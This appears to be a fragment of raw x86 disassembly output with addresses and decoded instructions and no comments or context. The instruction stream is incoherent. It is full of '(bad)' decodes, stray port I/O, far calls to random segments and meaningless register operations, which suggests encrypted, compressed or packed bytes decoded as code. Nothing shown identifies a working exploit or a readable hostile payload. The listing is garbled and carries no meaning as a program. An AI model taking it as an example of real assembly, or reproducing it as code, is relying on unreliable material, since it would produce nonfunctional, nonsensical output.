  415c45:	sbb    eax,0xdafc44a0
  415c4a:	sub    DWORD PTR [edi-0x9],ebp
  415c4d:	adc    esp,esp
  415c4f:	(bad)  
  415c50:	mov    ebp,0x9e6a5fe0
  415c55:	push   edx
  415c56:	jge    0x415c4f
  415c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c59:	mov    dl,0xca
  415c5b:	push   0xffffffcc
  415c5d:	(bad)  
  415c5e:	jp     0x415c92
  415c60:	xchg   ecx,eax
  415c61:	cmp    bh,BYTE PTR [eax-0x55]
  415c64:	movups XMMWORD PTR ds:0xf2bca60b,xmm3
  415c6b:	leave  
  415c6c:	in     eax,0x9f
  415c6e:	outs   dx,BYTE PTR ds:[esi]
  415c6f:	mov    bh,0xf
  415c71:	gs js  0x415c1e
  415c74:	jb     0x415c48
  415c76:	(bad)  
  415c77:	push   ds
  415c78:	or     DWORD PTR [edi-0x62947a4c],esp
  415c7e:	push   ss
  415c7f:	pop    edx
  415c80:	pop    ss
  415c81:	lea    ecx,[esi+0x74]
  415c84:	mov    eax,DWORD PTR [ebx-0x6abecbcb]
  415c8a:	(bad)
  415c8e:	imul   ebx,DWORD PTR [esi-0x64846755],0xbccb64ad
  415c98:	bound  esp,QWORD PTR [edi-0x5adf532c]
  415c9e:	push   0xffffffed
  415ca0:	and    BYTE PTR [edi],0xd5
  415ca3:	push   cs
  415ca4:	fwait
  415ca5:	dec    ebx
  415ca6:	jne    0x415d12
  415ca8:	jge    0x415cd4
  415caa:	loopne 0x415cb6
  415cac:	mov    edx,0xde2bd70b
  415cb1:	aaa    
  415cb2:	sar    bl,1
  415cb4:	or     DWORD PTR [edi],ecx
  415cb6:	outs   dx,DWORD PTR ds:[esi]
  415cb7:	lea    esp,[edi+0x3aa6b862]
  415cbd:	dec    esp
  415cbe:	cmp    bh,bl
  415cc0:	fidiv  DWORD PTR [eax+0x649b88c2]
  415cc6:	retf   
  415cc7:	enter  0xc6bf,0x51
  415ccb:	leave  
  415ccc:	scas   al,BYTE PTR es:[edi]
  415ccd:	mov    dl,0xfe
  415ccf:	and    al,0xd3
  415cd1:	in     eax,0x46
  415cd3:	push   0xffffffd0
  415cd5:	xchg   edx,eax
  415cd6:	inc    esp
  415cd7:	aad    0xc1
  415cd9:	sbb    cl,BYTE PTR [ebp+0x26]
  415cdc:	mov    al,0x32
  415cde:	test   al,0x5
  415ce0:	stc    
  415ce1:	out    0xc7,eax
  415ce3:	add    ecx,DWORD PTR [esi]
  415ce5:	mov    al,0xc4
  415ce7:	clc    
  415ce8:	inc    edi
  415ce9:	sbb    DWORD PTR [ebp+0x75],ecx
  415cec:	daa    
  415ced:	mov    eax,DWORD PTR [ebp+ecx*8+0x3a437706]
  415cf4:	inc    esp
  415cf5:	iret   
  415cf6:	ja     0x415d0e
  415cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cf9:	adc    esi,esp
  415cfb:	shl    ebp,cl
  415cfd:	ror    BYTE PTR [edx+0x1d835c7a],0xee
  415d04:	scas   al,BYTE PTR es:[edi]
  415d05:	in     al,0x56
  415d07:	mov    edi,0x58ae8e68
  415d0c:	push   0x1c
  415d0e:	inc    ecx
  415d0f:	aaa    
  415d10:	xchg   esi,eax
  415d11:	ss clc 
  415d13:	xlat   BYTE PTR ds:[ebx]
  415d14:	sub    DWORD PTR [ecx-0x1a],ecx
  415d17:	test   al,0x1f
  415d19:	pop    esi
  415d1a:	test   cl,bh
  415d1c:	xchg   esi,eax
  415d1d:	xchg   edi,eax
  415d1e:	pop    esi
  415d1f:	xchg   BYTE PTR ds:0x21ce71b0,cl
  415d25:	call   0xec064a76
  415d2a:	xchg   esi,eax
  415d2b:	jge    0x415cbd
  415d2d:	rol    BYTE PTR [ebx-0x5c],cl
  415d30:	addr16 call 0xde5eaaa5
  415d36:	retf   0xaa8d
  415d39:	aad    0x4f
  415d3b:	cli    
  415d3c:	(bad)  
  415d3d:	and    bl,BYTE PTR [eax+ecx*2]
  415d40:	mov    al,ds:0xee6abc6
  415d45:	ret    0x38df
  415d48:	add    dh,ah
  415d4a:	ds pop edx
  415d4c:	fidivr DWORD PTR [ebp-0x65]
  415d4f:	jmp    0x5d2d8973
  415d54:	sbb    al,0x10
  415d56:	cmp    al,0x1c
  415d58:	push   edi
  415d59:	retf   
  415d5a:	test   eax,0x86ff844
  415d5f:	xor    al,0xde
  415d61:	mov    ch,0x1c
  415d63:	inc    ebp
  415d64:	shl    BYTE PTR [ecx+0x4992466],cl
  415d6a:	jle    0x415d97
  415d6c:	(bad)  [ecx+0x9]
  415d6f:	and    edx,DWORD PTR ds:0xf0560481
  415d75:	inc    eax
  415d76:	into   
  415d77:	push   ebp
  415d78:	mov    esp,0x10d8b8ac
  415d7d:	add    eax,0xaa56d843
  415d82:	rol    DWORD PTR [edi-0x9],cl
  415d85:	mov    eax,ds:0xdea4c6e4
  415d8a:	and    BYTE PTR [eax-0x8],bh
  415d8d:	sbb    al,0x26
  415d8f:	mov    ebx,0x1c781803
  415d94:	cmp    ecx,ebp
  415d96:	jp     0x415dd2
  415d98:	jmp    esp
  415d9a:	mov    WORD PTR [edx],ss
  415d9c:	xor    esi,DWORD PTR [ebx]
  415d9e:	inc    esi
  415d9f:	fidiv  WORD PTR [ecx+edi*8]
  415da2:	mov    bl,0x2a
  415da4:	add    DWORD PTR [ebx],ebx
  415da6:	in     al,0x3e
  415da8:	test   al,0x11
  415daa:	xchg   DWORD PTR ss:[ebx+eiz*8],ecx
  415dae:	and    ecx,DWORD PTR [ecx-0x17]
  415db1:	sub    eax,0x707a8b52
  415db6:	and    BYTE PTR ds:0xfd522f5c,al
  415dbc:	xor    edi,DWORD PTR [eax-0x797e3d2]
  415dc2:	adc    ah,cl
  415dc4:	dec    eax
  415dc5:	frstor es:[eax-0x28558d88]
  415dcc:	sub    BYTE PTR [ebx-0x2fa58965],0xa2
  415dd3:	fst    DWORD PTR [esi+0x767f9cf]
  415dd9:	xor    eax,0xa62cf3e3
  415dde:	repz cli 
  415de0:	and    ch,BYTE PTR [ebx-0x5f]
  415de3:	mov    edi,0x3aff4c27
  415de8:	sbb    esi,0x52a3ebad
  415dee:	call   FWORD PTR [edi]
  415df0:	jmp    0x299e:0x25754765
  415df7:	fimul  DWORD PTR [edi-0x42]
  415dfa:	call   0x175c:0x832f5972
  415e01:	sub    BYTE PTR [edi-0x7a0d03a3],dl
  415e07:	nop
  415e08:	call   0x382f:0xb9cf3799
  415e0f:	ja     0x415e23
  415e11:	mov    cl,0x9c
  415e13:	pushw  es
  415e15:	sub    ecx,esi
  415e17:	jl     0x415da4
  415e19:	in     al,0x47
  415e1b:	pop    edi
  415e1c:	(bad)  
  415e1d:	fist   DWORD PTR [eax+0x52f5fe5a]
  415e23:	sbb    ebp,DWORD PTR [ebx+ecx*1-0x5a]
  415e27:	sub    al,0x4
  415e29:	xor    DWORD PTR [edx-0x4ea032aa],ecx
  415e2f:	cmp    BYTE PTR [ebx+0x14221c6e],dh
  415e35:	lods   al,BYTE PTR ds:[esi]
  415e36:	add    DWORD PTR [esi],esi
  415e38:	mov    ch,0x90
  415e3a:	cmp    BYTE PTR [eax+esi*2+0x3ff9e1a8],ah
  415e41:	sbb    edx,DWORD PTR [ecx-0x2f]
  415e44:	movhps xmm6,QWORD PTR [eax-0x67]
  415e48:	or     eax,0x86ab66b3
  415e4d:	out    0x40,al
  415e4f:	stos   DWORD PTR es:[edi],eax
  415e50:	xchg   BYTE PTR [ebx+0x30],dl
  415e53:	ins    DWORD PTR es:[edi],dx
  415e54:	test   al,0xe2
  415e56:	dec    edx
  415e57:	dec    BYTE PTR [eax-0x48479341]
  415e5d:	fldcw  WORD PTR [esi-0x3f]
  415e60:	and    esp,eax
  415e62:	xchg   ebx,eax
  415e63:	sub    BYTE PTR [edx-0x286f0333],bl
  415e69:	add    esi,eax
  415e6b:	call   0x6141:0xf2ef17d0
  415e72:	cmp    ebx,DWORD PTR [eax-0x39]
  415e75:	rcl    al,1
  415e77:	je     0x415e12
  415e79:	shl    BYTE PTR [edx+edi*4+0x11dfb9d2],1
  415e80:	(bad)  
  415e81:	(bad)  
  415e83:	je     0x415e88
  415e85:	int    0x55
  415e87:	pop    edx
  415e88:	in     eax,dx
  415e89:	xchg   edi,eax
  415e8a:	push   ds
  415e8b:	jnp    0x415e46
  415e8d:	movhps QWORD PTR [ebx+0x2],xmm2
  415e91:	imul   ecx,DWORD PTR [ebp+eax*1+0x5a],0x9a1a8c03
  415e99:	pop    edi
  415e9a:	pop    eax
  415e9b:	js     0x415e7b
  415e9d:	pop    ds
  415e9e:	pop    edi
  415e9f:	mov    esp,0x7e58131f
  415ea4:	and    ebp,DWORD PTR [ebp-0x43]
  415ea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ea8:	or     bh,BYTE PTR [edi+ecx*8]
  415eab:	paddq  mm6,QWORD PTR [ecx]
  415eae:	nop
  415eaf:	dec    esp
  415eb0:	cwde   
  415eb1:	xchg   ecx,eax
  415eb2:	mov    dh,0x60
  415eb4:	add    al,0x62
  415eb6:	outs   dx,DWORD PTR ds:[esi]
  415eb7:	ret    
  415eb8:	stos   DWORD PTR es:[edi],eax
  415eb9:	add    eax,0xfd25e250
  415ebe:	jecxz  0x415ec1
  415ec0:	(bad)  
  415ec2:	stos   BYTE PTR es:[edi],al
  415ec3:	stos   BYTE PTR es:[edi],al
  415ec4:	sub    eax,0xb3b46a06
  415ec9:	int3   
  415eca:	popa   
  415ecb:	pop    es
  415ecc:	pop    ebx
  415ecd:	mov    gs,WORD PTR ds:0xf8fa78af
  415ed3:	popa   
  415ed4:	ror    DWORD PTR [ebx+0x76],0xba
  415ed8:	mov    eax,ebx
  415eda:	in     al,0xe0
  415edc:	fadd   st(0),st
  415ede:	mov    ch,0xd6
  415ee0:	xchg   ecx,eax
  415ee1:	and    BYTE PTR [esi-0x17],0x4e
  415ee5:	xlat   BYTE PTR ds:[ebx]
  415ee6:	mov    edx,0x1e9d28f5
  415eeb:	mov    cl,0xd4
  415eed:	mul    cl
  415eef:	inc    ebp
  415ef0:	fwait
  415ef1:	das    
  415ef2:	pop    ecx
  415ef3:	add    al,0x25
  415ef5:	and    edx,ebp
  415ef7:	adc    esp,ecx
  415ef9:	stos   DWORD PTR es:[edi],eax
  415efa:	mov    al,ds:0x4be9aa8a
  415eff:	adc    DWORD PTR [esi+0x29],esp
  415f02:	retf   
  415f03:	or     dh,BYTE PTR [esi+0x1ad1df98]
  415f09:	dec    ecx
  415f0a:	pop    esp
  415f0b:	mov    DWORD PTR [ecx],eax
  415f0d:	fmulp  st(2),st
  415f0f:	mov    ecx,0x66fdb6da
  415f14:	fimul  WORD PTR [esi-0x112a4baf]
  415f1a:	cmp    al,0x9d
  415f1c:	mov    bl,0x5d
  415f1e:	jg     0x415ed6
  415f20:	jnp    0x415ee4
  415f22:	or     edi,DWORD PTR es:[edi-0x1886a349]
  415f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f2a:	inc    ecx
  415f2b:	jmp    0xed3:0x1ce61a27
  415f32:	sub    eax,0xa2308f0c
  415f37:	cdq    
  415f38:	or     DWORD PTR [ebp-0xd],edx
  415f3b:	jno    0x415f7c
  415f3d:	xor    bh,al
  415f3f:	enter  0x312e,0x40
  415f43:	cmp    eax,0x4df19cf4
  415f48:	add    eax,0x972b8656
  415f4d:	jl     0x415f00
  415f4f:	mov    dl,0x97
  415f51:	fstp   QWORD PTR [esi-0x64]
  415f54:	jge    0x415f6c
  415f56:	or     edi,DWORD PTR [eax+0x13]
  415f59:	das    
  415f5a:	push   0xffffffb4
  415f5c:	(bad)  
  415f5d:	in     eax,dx
  415f5e:	sub    al,0x3
  415f60:	xchg   esp,eax
  415f61:	pusha  
  415f62:	inc    edi
  415f63:	aad    0xe9
  415f65:	(bad)  
  415f66:	shr    BYTE PTR [eax-0x2d],1
  415f69:	push   ss
  415f6a:	mov    edi,0xa9b64dc5
  415f6f:	outs   dx,BYTE PTR ds:[esi]
  415f70:	jae    0x415fa7
  415f72:	push   ebp
  415f73:	mov    dh,0x9b
  415f75:	sub    DWORD PTR [esi],ecx
  415f77:	sub    al,0x22
  415f79:	ja     0x415fc7
  415f7b:	adc    al,ah
  415f7d:	mov    eax,ds:0x914d6091
  415f82:	sbb    BYTE PTR [ecx+0x7c],0x56
  415f86:	cdq    
  415f87:	gs adc al,0x16
  415f8a:	cmp    al,BYTE PTR [edx+0x66]
  415f8d:	mov    ds,WORD PTR [eax+0x71]
  415f90:	loope  0x415f8b
  415f92:	jg     0x415f28
  415f94:	inc    edi
  415f95:	xchg   edx,eax
  415f96:	xor    eax,0xa55f5c1c
  415f9b:	xor    esi,esp
  415f9d:	xor    bh,BYTE PTR [edi+0x78]
  415fa0:	jg     0x415f5a
  415fa2:	clc    
  415fa3:	mov    dl,0x3e
  415fa5:	mov    ecx,0x259666b9
  415faa:	sbb    ebp,esi
  415fac:	loope  0x415fb1
  415fae:	neg    DWORD PTR [edi]
  415fb0:	mov    edi,0x17f95de4
  415fb5:	cmp    al,0x9b
  415fb7:	in     al,0xcd
  415fb9:	push   ds
  415fba:	sbb    BYTE PTR [edx-0x76],0x56
  415fbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fbf:	push   ebx
  415fc0:	jb     0x41603d
  415fc2:	icebp  
  415fc3:	jecxz  0x41601d
  415fc5:	in     eax,dx
  415fc6:	cmp    eax,0xd9c3f98d
  415fcb:	ins    DWORD PTR es:[edi],dx
  415fcc:	out    dx,eax
  415fcd:	jecxz  0x415fbd
  415fcf:	jle    0x415fa0
  415fd1:	push   edx
  415fd2:	or     BYTE PTR [ebx],cl
  415fd4:	jnp    0x415fd2
  415fd6:	call   DWORD PTR [edx]
  415fd8:	imul   edi,DWORD PTR [edi-0x22],0x60
  415fdc:	scas   eax,DWORD PTR es:[edi]
  415fdd:	inc    edi
  415fde:	repnz sub BYTE PTR [edx],dh
  415fe1:	adc    al,0xd0
  415fe3:	pop    edx
  415fe4:	adc    dl,ch
  415fe6:	ins    BYTE PTR es:[edi],dx
  415fe7:	loop   0x415f74
  415fe9:	cmp    ch,BYTE PTR [esi-0x7a]
  415fec:	(bad)  
  415fed:	pop    ss
  415fee:	mov    esp,0xfb53daeb
  415ff3:	inc    ebp
  415ff4:	popa   
  415ff5:	mov    dh,0xc9
  415ff7:	(bad)  
  415ff9:	push   edi
  415ffa:	scas   al,BYTE PTR es:[edi]
  415ffb:	push   es
  415ffc:	stos   DWORD PTR es:[edi],eax
  415ffd:	fwait
  415ffe:	jp     0x415fd4
  416000:	mov    esp,DWORD PTR [ebx-0x7806874e]
  416006:	mov    dl,BYTE PTR [eax+0x69]
  416009:	mov    ds:0xbb40d051,eax
  41600e:	sub    al,0xbb
  416010:	sub    eax,0xa400a140
  416015:	repz cmp DWORD PTR [ecx+eiz*4],ecx
  416019:	out    0xf,eax
  41601b:	call   0x9e65:0x9d6eadf
  416022:	push   edi
  416023:	dec    esp
  416024:	add    al,0xd
  416026:	in     al,dx
  416027:	mov    edi,0xdbea656
  41602c:	(bad)  
  41602d:	jle    0x416032
  41602f:	mov    ah,0xa8
  416031:	mov    ds:0x2213c4d8,eax
  416036:	or     ecx,DWORD PTR [ecx+edi*2]
  416039:	xchg   ebp,eax
  41603a:	mov    ebp,0xa0705ea8
  41603f:	mov    DWORD PTR [eax-0x620465a7],ebp
  416045:	mov    al,0x6c
  416047:	or     edi,DWORD PTR [esi+0x3f715a9e]
  41604d:	xor    BYTE PTR [ecx],al
  41604f:	mov    bl,0xe
  416051:	or     BYTE PTR [eax],al
  416053:	test   eax,0xff2f4892
  416058:	in     al,0xa2
  41605a:	int3   
  41605b:	dec    esp
  41605c:	mov    cl,0x17
  41605e:	add    eax,0xa667960b
  416063:	or     eax,0x967d84f4
  416068:	retf   0x5a0f
  41606b:	or     BYTE PTR [ecx-0x3973d446],0x45
  416072:	dec    edx
  416073:	and    DWORD PTR [eax+eax*8],0xffffffe0
  416077:	mov    dh,0xd5
  416079:	cmp    DWORD PTR [edi+edx*1-0x9],edi
  41607d:	fadd   DWORD PTR [ebp+0xbcdd474]
  416083:	test   al,0x55
  416085:	push   ebp
  416086:	scas   eax,DWORD PTR es:[edi]
  416087:	scas   al,BYTE PTR es:[edi]
  416088:	(bad)
  41608b:	mov    ebx,ss
  41608d:	sub    ebp,DWORD PTR [ecx]
  41608f:	cmp    BYTE PTR [eax-0x7],0xf
  416093:	into   
  416094:	test   BYTE PTR [edi+0xc35d168],ah
  41609a:	imul   edx,DWORD PTR [ebx+0x377d2c89],0x59
  4160a1:	icebp  
  4160a2:	(bad)  
  4160a3:	cdq    
  4160a4:	cwde   
  4160a5:	dec    esp
  4160a6:	or     DWORD PTR [eax+0x68],ecx
  4160a9:	cmp    BYTE PTR [edi+eax*4+0x4],ch
  4160ad:	mov    BYTE PTR cs:[ebx],dl
  4160b0:	mov    eax,0x311972fc
  4160b5:	std    
  4160b6:	ret    
  4160b7:	mov    ds:0xd82ad51f,al
  4160bc:	dec    ebp
  4160bd:	test   eax,0x77fea616
  4160c2:	lea    ecx,[ecx+0x72]
  4160c5:	xchg   esp,eax
  4160c6:	adc    al,dh
  4160c8:	xchg   esi,eax
  4160c9:	push   esi
  4160ca:	(bad)  
  4160cb:	and    al,0x7a
  4160cd:	mov    ecx,esi
  4160cf:	mov    esp,0xe730f4d0
  4160d4:	xor    dl,dl
  4160d6:	jbe    0x4160ec
  4160d8:	hlt    
  4160d9:	xchg   ebp,eax
  4160da:	call   0xe9992bb
  4160df:	pop    esp
  4160e0:	lahf   
  4160e1:	inc    edi
  4160e2:	aas    
  4160e3:	ret    
  4160e4:	fwait
  4160e5:	sub    DWORD PTR [ecx-0x37bc010],0xb24af7c2
  4160ef:	cwde   
  4160f0:	inc    esi
  4160f1:	add    dl,al
  4160f3:	add    eax,edi
  4160f5:	cmp    BYTE PTR [ecx],dh
  4160f7:	xor    BYTE PTR [edi],dl
  4160f9:	aam    0x34
  4160fb:	mov    ch,0xef
  4160fd:	add    BYTE PTR [ecx],dl
  4160ff:	add    dh,BYTE PTR [edx]
  416101:	arpl   WORD PTR [esi+0x58],di
  416104:	sbb    edi,esi
  416106:	jmp    0x4160db
  416108:	push   ecx
  416109:	mov    dl,0x31
  41610b:	pop    esi
  41610c:	dec    ebp
  41610d:	mov    BYTE PTR [eax-0x7b2e2f64],dh
  416113:	out    0x0,al
  416115:	xchg   edi,eax
  416116:	repz cdq 
  416118:	mov    dl,0x6a
  41611a:	setge  dl
  41611d:	or     ebx,DWORD PTR [esi+0x7ac75d6e]
  416123:	ss popf 
  416125:	push   es
  416126:	jmp    0xe1444a7
  41612b:	push   edx
  41612c:	and    BYTE PTR [esi-0x52ba49a8],0x98
  416133:	sub    BYTE PTR [ecx-0x7f],dl
  416136:	xor    eax,0x8d8f02dd
  41613b:	sub    DWORD PTR [ecx-0xd],esp
  41613e:	lds    ecx,FWORD PTR [esi]
  416140:	mov    bl,0x60
  416142:	div    BYTE PTR [ebx]
  416144:	push   ecx
  416145:	mov    dh,0x31
  416147:	mov    BYTE PTR [esi-0x6d617ff2],bl
  41614d:	clc    
  41614e:	xchg   ecx,eax
  41614f:	and    bh,0x59
  416152:	push   esi
  416153:	loope  0x416160
  416155:	mov    edx,0x73a2571f
  41615a:	(bad)  
  41615b:	std    
  41615c:	call   0x2b12f162
  416161:	fwait
  416162:	or     DWORD PTR [ecx-0xa],ebx
  416165:	xor    al,ch
  416167:	push   ds
  416168:	or     al,bh
  41616a:	call   0x2f22ae85
  41616f:	inc    ebp
  416170:	jnp    0x416189
  416172:	and    BYTE PTR ds:[eax],cl
  416175:	adc    bh,BYTE PTR [eax]
  416177:	loopne 0x4161bd
  416179:	mov    dh,0x6e
  41617b:	pushf  
  41617c:	stos   BYTE PTR es:[edi],al
  41617d:	mov    WORD PTR [ecx+esi*8+0x5cde0c13],?
  416184:	inc    ecx
  416185:	push   cs
  416186:	mov    esi,0x532ffaee
  41618b:	mov    ebx,0x131828c4
  416190:	sub    al,0x7
  416192:	and    BYTE PTR [edx],al
  416194:	cmp    BYTE PTR [esi-0x57],ah
  416197:	push   ecx
  416198:	xor    eax,0xa1e3f3f9
  41619d:	shl    bl,cl
  41619f:	pushf  
  4161a0:	scas   eax,DWORD PTR es:[edi]
  4161a1:	in     eax,dx
  4161a2:	cwde   
  4161a3:	jmp    0x416179
  4161a5:	cmp    al,0xbe
  4161a7:	inc    esp
  4161a8:	es jno 0x416135
  4161ab:	popa   
  4161ac:	aas    
  4161ad:	dec    eax
  4161ae:	fbld   TBYTE PTR [esi-0x6f]
  4161b1:	jge    0x4161ea
  4161b3:	mov    es,edi
  4161b5:	sub    bh,BYTE PTR [ecx]
  4161b7:	mov    esi,0x6e82348a
  4161bc:	cmp    BYTE PTR [esi+0x1f],dl
  4161bf:	jo     0x416204
  4161c1:	jle    0x41616a
  4161c3:	in     eax,dx
  4161c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161c5:	jg     0x416182
  4161c7:	jne    0x4161e0
  4161c9:	fild   DWORD PTR [edi-0x5]
  4161cc:	popf   
  4161cd:	data16 or bh,bh
  4161d0:	fiadd  WORD PTR [ebp-0x1e]
  4161d3:	push   ds
  4161d4:	push   edx
  4161d5:	in     al,0xd8
  4161d7:	sar    BYTE PTR [ebx+0x5f48dfb3],0xb3
  4161de:	pop    es
  4161df:	pop    eax
  4161e0:	xchg   esp,eax
  4161e1:	aas    
  4161e2:	addr16 sti 
  4161e4:	xchg   edi,eax
  4161e5:	test   al,0x49
  4161e7:	xlat   BYTE PTR ds:[ebx]
  4161e8:	icebp  
  4161e9:	inc    esp
  4161ea:	cmp    ah,al
  4161ec:	aaa    
  4161ed:	mov    ah,0x64
  4161ef:	push   0x9fb3ec66
  4161f4:	pop    ds
  4161f5:	arpl   WORD PTR [ebp+0x142b1e39],bp
  4161fb:	lahf   
  4161fc:	loope  0x4161d3
  4161fe:	xor    edi,DWORD PTR [ebx-0x4d]
  416201:	(bad)  
  416202:	aad    0x42
  416204:	mov    DWORD PTR [esi-0x16],ecx
  416207:	pop    edi
  416208:	jae    0x416205
  41620a:	sub    eax,0xf820ffc
  41620f:	loope  0x4161e2
  416211:	adc    al,0x5e
  416213:	dec    ebp
  416214:	lock and eax,DWORD PTR es:[ebx+edx*4+0x35b82b17]
  41621d:	jo     0x41620f
  41621f:	jp     0x4161f8
  416221:	and    ebp,DWORD PTR [esi-0xd]
  416224:	inc    eax
  416225:	cmp    eax,0xb505316d
  41622a:	xchg   ebp,eax
  41622b:	lahf   
  41622c:	mov    WORD PTR [edx],ds
  41622e:	fcom   DWORD PTR [ebx]
  416230:	push   edx
  416231:	adc    eax,0x25751d8
  416236:	mov    cl,0xeb
  416238:	adc    eax,0xb29ab2f4
  41623d:	outs   dx,BYTE PTR ds:[esi]
  41623e:	ja     0x4162aa
  416240:	add    BYTE PTR [edi],ch
  416242:	in     al,0x1c
  416244:	inc    esp
  416245:	mov    DWORD PTR [edi],ebx
  416247:	mov    ds:0x81eb1701,al
  41624c:	push   0x5a
  41624e:	bound  ebp,QWORD PTR es:[eax+0x676a327e]
  416255:	das    
  416256:	or     eax,DWORD PTR [esi]
  416258:	lock (bad) [eax]
  41625b:	cld    
  41625c:	xor    eax,0xbdf995d8
  416261:	rcl    DWORD PTR [eax],0x18
  416264:	inc    edx
  416265:	ss xchg esp,eax
  416267:	enter  0xf23a,0xc
  41626b:	lods   eax,DWORD PTR ds:[esi]
  41626c:	and    ch,BYTE PTR [esi]
  41626e:	aas    
  41626f:	xor    ebx,DWORD PTR ds:0x55ee56a6
  416275:	adc    ch,0x27
  416278:	mov    dh,0x81
  41627a:	(bad)  
  41627d:	std    
  41627e:	xor    eax,0xa03dc8f2
  416283:	add    edx,ebp
  416285:	sbb    BYTE PTR [esi],cl
  416287:	jg     0x4162dc
  416289:	mov    DWORD PTR [ebx],esp
  41628b:	fdiv   QWORD PTR [esi+0x71]
  41628e:	nop
  41628f:	repz and bh,BYTE PTR [edi+0x69abc7f0]
  416296:	jo     0x4162d6
  416298:	scas   eax,DWORD PTR es:[edi]
  416299:	imul   esp,DWORD PTR [ebp-0x5755a19b],0x90c5689b
  4162a3:	mov    ds:0x7fb21783,eax
  4162a8:	jg     0x416259
  4162aa:	sbb    eax,0x950545f2
  4162af:	outs   dx,BYTE PTR ds:[esi]
  4162b0:	aam    0xd
  4162b2:	xchg   DWORD PTR [edx+0x4ba29be6],edi
  4162b8:	mov    ah,0x7
  4162ba:	mov    fs,WORD PTR [esi]
  4162bc:	repz sbb dl,0x67
  4162c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162c1:	(bad)  
  4162c2:	stc    
  4162c3:	retf   
  4162c4:	int    0xed
  4162c6:	cli    
  4162c7:	mov    ecx,0xd1fc9e85
  4162cc:	xor    DWORD PTR [edi+eax*2],esp
  4162cf:	add    dh,BYTE PTR fs:[esi+0x1d]
  4162d3:	sub    eax,0xeae1e501
  4162d8:	(bad)  
  4162d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162da:	or     eax,0xe183671b
  4162df:	test   eax,0xec961f11
  4162e4:	xchg   ebp,eax
  4162e5:	lock sbb edi,ecx
  4162e8:	int3   
  4162e9:	scas   eax,DWORD PTR es:[edi]
  4162ea:	das    
  4162eb:	pushf  
  4162ec:	sbb    al,0xd3
  4162ee:	xor    esi,DWORD PTR [edx-0x4a7e8576]
  4162f4:	mov    bh,0xbb
  4162f6:	jg     0x4162a3
  4162f8:	jns    0x41632f
  4162fa:	ficomp DWORD PTR [ebx]
  4162fc:	push   DWORD PTR [esi+eax*8]
  4162ff:	pushf  
  416300:	cmp    edx,DWORD PTR [eax-0x50]
  416303:	jb     0x4162ad
  416305:	stc    
  416306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416307:	inc    edx
  416308:	mov    ecx,0x5e384803
  41630e:	cwde   
  41630f:	jne    0x416354
  416311:	adc    al,0x1e
  416313:	rcl    BYTE PTR ds:0x47ecba8,0x4b
  41631a:	in     eax,dx
  41631b:	jge    0x416330
  41631d:	aas    
  41631e:	xchg   edi,eax
  41631f:	loope  0x416362
  416321:	lods   eax,DWORD PTR ds:[esi]
  416322:	pop    eax
  416323:	mov    ebp,0x899c5552
  416328:	mov    bh,0x17
  41632a:	loopne 0x4162f2
  41632c:	jbe    0x4162b4
  41632e:	loope  0x41631c
  416330:	jg     0x4162f2
  416332:	lods   al,BYTE PTR ds:[esi]
  416333:	mov    al,ds:0xfb828213
  416338:	call   0xfb99:0x6239ddfa
  41633f:	jb     0x4162f1
  416341:	add    dl,dl
  416343:	sub    al,BYTE PTR [ebp-0x7a]
  416346:	sub    BYTE PTR [ebx+0xc],0xc2
  41634a:	imul   eax,eax,0xffffff89
  41634d:	(bad)  ds:0x3dc90131
  416353:	(bad)  
  416354:	pushf  
  416355:	adc    BYTE PTR [ecx],dh
  416357:	hlt    
  416358:	ins    DWORD PTR es:[edi],dx
  416359:	dec    eax
  41635a:	fisttp WORD PTR [ecx]
  41635c:	dec    eax
  41635d:	in     al,dx
  41635e:	mov    DWORD PTR [edx+0x7c],ebx
  416361:	mov    al,ds:0x3ed8ceb7
  416366:	inc    eax
  416367:	arpl   cx,dx
  416369:	mov    al,ds:0xa9689f4d
  41636e:	clc    
  41636f:	sub    eax,0xacf79177
  416374:	stos   BYTE PTR es:[di],al
  416376:	mov    cs,WORD PTR [edx+ebp*4]
  416379:	add    al,0xd4
  41637b:	js     0x41638f
  41637d:	xchg   ecx,eax
  41637e:	mov    cs,ebx
  416380:	out    dx,eax
  416381:	out    dx,eax
  416382:	sbb    edx,DWORD PTR fs:[edx-0x60253c0]
  416389:	mov    bl,0x14
  41638b:	pop    eax
  41638c:	add    bh,ah
  41638e:	push   edi
  41638f:	sbb    DWORD PTR [ebx],eax
  416391:	cs (bad) 
  416393:	cmp    DWORD PTR [ebx+0x73c2ca9e],esp
  416399:	out    0x7b,al
  41639b:	ja     0x4163cf
  41639d:	push   eax
  41639e:	jae    0x41632d
  4163a0:	mov    edx,0xcb694e59
  4163a5:	out    0x6,eax
  4163a7:	data16 cmp al,0x6a
  4163aa:	jne    0x416382
  4163ac:	js     0x41636d
  4163ae:	sub    al,0x1a
  4163b0:	adc    dl,BYTE PTR [ebp-0x13]
  4163b3:	mov    DWORD PTR [esi],esp
  4163b5:	mov    ds:0x9877f6e6,al
  4163ba:	dec    ebx
  4163bb:	mov    al,0xd7
  4163bd:	push   ecx
  4163be:	xchg   ebp,eax
  4163bf:	pop    ebx
  4163c0:	call   0x1db0:0x7f74806f
  4163c7:	stos   BYTE PTR es:[edi],al
  4163c8:	jp     0x4163eb
  4163ca:	adc    eax,DWORD PTR [eax+0x2f146780]
  4163d0:	(bad)  
  4163d1:	scas   eax,DWORD PTR es:[edi]
  4163d2:	ins    DWORD PTR es:[edi],dx
  4163d3:	and    al,0x1a
  4163d5:	fnstenv [ecx]
  4163d7:	shl    DWORD PTR [esi-0xa7cdf4],1
  4163dd:	stos   DWORD PTR es:[edi],eax
  4163de:	inc    esi
  4163df:	lock xor eax,DWORD PTR [ebp+eiz*1+0x66]
  4163e4:	sub    DWORD PTR [esi-0x46e2593d],edx
  4163ea:	mov    DWORD PTR [eax],0x3999a52c
  4163f0:	pop    esp
  4163f1:	and    ch,BYTE PTR [ecx+0xf]
  4163f4:	sbb    ebx,DWORD PTR [ecx+0x37]
  4163f7:	cmp    eax,0xde5a8634
  4163fc:	add    cl,BYTE PTR [ebx]
  4163fe:	cmp    cl,BYTE PTR [edi+0x5b8c5bb6]
